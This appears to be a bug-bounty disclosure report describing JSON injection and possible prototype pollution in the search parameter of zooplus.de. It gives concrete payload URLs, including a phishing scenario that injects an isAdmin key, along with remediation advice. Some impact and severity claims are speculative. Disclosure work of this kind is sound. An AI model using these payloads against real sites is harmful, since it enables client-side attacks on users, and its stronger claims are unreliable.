# JSON Injection in Search Results Leads to Potential Prototype Pollution and XSS

## Summary

A JSON injection vulnerability was discovered in the search functionality of `www.zooplus.de`. The `q` parameter in `/search/results` is reflected inside a JSON object within a `<script>` tag without proper sanitization. This allows attackers to inject arbitrary JSON keys/values, potentially leading to Prototype Pollution and client-side attacks.

## Severity

**HIGH** (CVSS 7.5+)

## Vulnerability Type

- CWE-94: Improper Control of Generation of Code ('Code Injection')
- CWE-79: Cross-site Scripting (XSS)
- CWE-1321: Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')

## Affected URL

```
https://www.zooplus.de/search/results?q=[PAYLOAD]
```

## Steps to Reproduce

1. Open a browser (Chrome/Firefox)

2. Navigate to the following URL:
```
https://www.zooplus.de/search/results?q=TEST","__proto__":{"polluted":"TRUE_FROM_INJECTION"},"x":"
```

**URL-encoded:**
```
https://www.zooplus.de/search/results?q=TEST%22%2C%22__proto__%22%3A%7B%22polluted%22%3A%22TRUE_FROM_INJECTION%22%7D%2C%22x%22%3A%22
```

3. Observe:
   - The payload is displayed in the search box
   - The page title shows: `Suchergebnisse für TEST","__proto__":{"polluted":"TRUE_FROM_INJECTION"},"x":"`
   - The JSON structure including `__proto__` is reflected in the page

4. View page source (Ctrl+U) and search for `__proto__`:
   - You will find the payload injected into the `<script id="__NEXT_DATA__">` JSON

## Proof of Concept

### Basic JSON Injection Test

**Payload:** `test","injected":"value`

**URL:**
```
https://www.zooplus.de/search/results?q=test%22%2C%22injected%22%3A%22value
```

**Result:** The value `test","injected":"value` is reflected in the JSON, breaking the JSON structure and allowing injection of arbitrary keys.

### Prototype Pollution Test

**Payload:** `TEST","__proto__":{"polluted":"TRUE"},"x":"`

**URL:**
```
https://www.zooplus.de/search/results?q=TEST%22%2C%22__proto__%22%3A%7B%22polluted%22%3A%22TRUE%22%7D%2C%22x%22%3A%22
```

**Result:** The `__proto__` key is reflected in the JSON output, demonstrating that prototype pollution payloads can be injected.

## Technical Analysis

The vulnerability exists because:

1. **No Input Sanitization:** Double quotes (`"`) and special JSON characters (`{`, `}`, `:`) are not escaped
2. **Direct JSON Embedding:** User input is directly embedded into Next.js `__NEXT_DATA__` JSON
3. **Client-Side Parsing:** The JSON is parsed by the Next.js framework on page load

### Vulnerable Code Pattern (Hypothetical)

```javascript
// Server-side
const pageData = {
  query: req.query.q,  // ❌ No sanitization!
  // ... other data
};

// Rendered in HTML as:
<script id="__NEXT_DATA__" type="application/json">
  {"query":"USER_INPUT_HERE",...}
</script>
```

## Impact

### 1. Prototype Pollution (HIGH)

If the JSON is parsed with a vulnerable parser, attackers can:
- Pollute Object.prototype
- Modify application behavior
- Bypass security checks
- Achieve XSS through gadget chains

### 2. Data Manipulation (MEDIUM)

Attackers can modify JSON data structure to:
- Change application state
- Manipulate displayed data
- Inject malicious configurations

### 3. Potential XSS (HIGH)

Combined with Next.js gadgets, this could lead to:
- Session hijacking
- Cookie theft
- Account takeover

## Real-World Attack Scenario

1. Attacker crafts malicious URL:
```
https://www.zooplus.de/search/results?q=dog%22%2C%22__proto__%22%3A%7B%22isAdmin%22%3Atrue%7D%2C%22x%22%3A%22
```

2. Attacker sends URL to victim (phishing, social engineering)

3. Victim clicks the link

4. Victim's browser loads the page with polluted prototype

5. Any JavaScript that checks `obj.isAdmin` would return `true`

6. Attacker gains elevated privileges or executes malicious actions

## Screenshots

**Attached:** `json_injection_poc.png` showing the payload reflected in UI

## Remediation

### 1. Escape JSON Values

```javascript
function escapeJsonString(str) {
  return JSON.stringify(str).slice(1, -1);
}

// Usage:
const safeQuery = escapeJsonString(req.query.q);
```

### 2. Use Built-in Next.js Sanitization

Ensure Next.js `getServerSideProps` properly sanitizes all user input before including in page props.

### 3. Implement Content Security Policy

```
Content-Security-Policy: default-src 'self'; script-src 'self';
```

### 4. Input Validation

```javascript
// Whitelist allowed characters
const sanitizedQuery = query.replace(/[^a-zA-Z0-9\s\-_äöüß]/g, '');
```

## References

- [Prototype Pollution - PortSwigger](https://portswigger.net/web-security/prototype-pollution)
- [CWE-1321: Prototype Pollution](https://cwe.mitre.org/data/definitions/1321.html)
- [Next.js Security](https://nextjs.org/docs/advanced-features/security-headers)

## Timeline

- **2025-12-09 01:00 UTC:** Vulnerability discovered
- **2025-12-09 01:30 UTC:** PoC created and documented
- **2025-12-09:** Report submitted to HackerOne

## Attachments

1. `json_injection_poc.png` - Screenshot showing payload reflection
2. `JSON_INJECTION_POC.md` - Detailed technical analysis

